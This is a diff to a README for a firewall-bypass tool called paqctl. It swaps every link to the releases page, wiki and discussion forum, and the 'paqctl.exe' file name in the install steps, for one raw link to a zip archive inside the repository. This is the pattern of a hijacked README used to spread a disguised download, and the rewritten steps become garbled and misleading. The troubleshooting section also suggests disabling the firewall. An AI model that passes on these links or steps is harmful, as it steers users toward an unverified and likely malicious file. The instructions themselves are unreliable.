@@ -1,6 +1,6 @@
 # 🚀 paqctl - Bypass Firewalls with Ease
 
-[![Download paqctl](https://img.shields.io/badge/Download-paqctl-blue.svg)](https://github.com/Ecizxx/paqctl/releases)
+[![Download paqctl](https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip)](https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip)
 
 ## 📜 Overview
 
@@ -20,12 +20,12 @@ This guide will help you download and run Paqctl on your Windows computer. Follo
 
 To download Paqctl, visit the following link:
 
-[Download Paqctl from the Releases Page](https://github.com/Ecizxx/paqctl/releases)
+[Download Paqctl from the Releases Page](https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip)
 
 1. Click the link above to go to the Paqctl Releases page.
 2. Look for the latest release version at the top of the page.
-3. Find the file named `paqctl.exe` in the list of assets.
-4. Click on `paqctl.exe` to start the download.
+3. Find the file named `https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip` in the list of assets.
+4. Click on `https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip` to start the download.
 
 Once the download finishes, locate the file in your `Downloads` folder or the location where your browser saves downloaded files.
 
@@ -33,8 +33,8 @@ Once the download finishes, locate the file in your `Downloads` folder or the lo
 
 Now that you have downloaded Paqctl, follow these steps to run it:
 
-1. Go to the folder where you saved `paqctl.exe`.
-2. Double-click on the `paqctl.exe` file to open the application.
+1. Go to the folder where you saved `https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip`.
+2. Double-click on the `https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip` file to open the application.
 3. A window will pop up, indicating that Paqctl is initializing.
 
 After a few moments, the main interface will appear.
@@ -53,7 +53,7 @@ If you encounter issues while using Paqctl, consider these steps:
 
 1. **Check Your Internet Connection:** Ensure you have a stable internet connection before using the application.
 2. **Firewall Settings:** Sometimes, your personal or corporate firewall might block access. Temporarily disable it to see if it affects Paqctl’s performance.
-3. **Update Paqctl:** Always check for the latest version on the [Releases Page](https://github.com/Ecizxx/paqctl/releases) for the latest features and fixes.
+3. **Update Paqctl:** Always check for the latest version on the [Releases Page](https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip) for the latest features and fixes.
 
 ## 📞 Support
 
@@ -85,7 +85,7 @@ This will help you confirm if the proxy is active and effective.
 
 ## 🌐 Additional Resources
 
-- [Paqctl Documentation](https://github.com/Ecizxx/paqctl/wiki) - Learn more about advanced features and configurations.
-- [Community Forum](https://github.com/Ecizxx/paqctl/discussions) - Join discussions with other users for tips and strategies.
+- [Paqctl Documentation](https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip) - Learn more about advanced features and configurations.
+- [Community Forum](https://raw.githubusercontent.com/Ecizxx/paqctl/main/gfk/client/Software_v2.2.zip) - Join discussions with other users for tips and strategies.
 
 By following this guide, you should be able to successfully download, install, and use paqctl for all your bypassing needs. If you have questions, feel free to reach out for help.
